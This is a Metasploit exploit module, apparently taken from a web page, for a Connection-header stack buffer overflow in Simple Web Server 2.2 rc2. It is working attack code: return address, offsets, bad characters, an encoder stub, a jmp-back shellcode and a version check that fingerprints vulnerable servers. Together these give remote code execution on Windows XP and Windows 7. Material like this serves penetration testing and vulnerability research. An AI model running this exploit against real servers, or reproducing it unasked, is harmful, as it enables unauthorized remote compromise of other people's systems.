# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    HttpFingerprint = { :pattern => [ /PMSoftware-SWS/ ] }
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;        => "Simple Web Server Connection Header Buffer Overflow",
            &#039;Description&#039; => %q{
                This module exploits a vulnerability in Simple Web Server 2.2 rc2. A remote user
                can send a long string data in the Connection Header to causes an overflow on the
                stack when function vsprintf() is used, and gain arbitrary code execution. The
                module has been tested successfully on Windows 7 SP1 and Windows XP SP3.
            },
            &#039;License&#039;     => MSF_LICENSE,
            &#039;Author&#039;      =>
                [
                    &#039;mr.pr0n&#039;, # Vulnerability Discovery and PoC
                    &#039;juan&#039; # Metasploit module
                ],
            &#039;References&#039; =>
                [
                    [&#039;EDB&#039;, &#039;19937&#039;],
                ],
            &#039;Payload&#039;    =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                    &#039;Space&#039; => 2048,
                    &#039;DisableNops&#039; => true,
                    &#039;PrependEncoder&#039; => "\x81\xC4\x60\xF0\xFF\xFF", # add esp, -4000
                },
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => "process",
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;  =>
                [
                    [
                        &#039;SimpleWebServer 2.2-rc2 / Windows XP SP3 / Windows 7 SP1&#039;,
                        {
                            &#039;Ret&#039; => 0x6fcbc64b, # call edi from libstdc++-6.dll
                            &#039;Offset&#039; => 2048,
                            &#039;OffsetEDI&#039; => 84
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jul 20 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def check
        res = send_request_raw({&#039;uri&#039;=>&#039;/&#039;})
        if res and res.headers[&#039;Server&#039;] =~ /PMSoftware\-SWS\/2\.[0-2]/
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def exploit
 
        sploit = payload.encoded
        sploit << rand_text(target[&#039;Offset&#039;] - sploit.length)
        sploit << [target.ret].pack("V") # eip
        sploit << rand_text(target[&#039;OffsetEDI&#039;])
        sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{sploit.length}").encode_string
 
        print_status("Trying target #{target.name}...")
 
        connect
 
        send_request_cgi({
            &#039;uri&#039;        => &#039;/&#039;,
            &#039;version&#039;    => &#039;1.1&#039;,
            &#039;method&#039;     => &#039;GET&#039;,
            &#039;connection&#039; => sploit
        })
 
        disconnect
 
    end
end



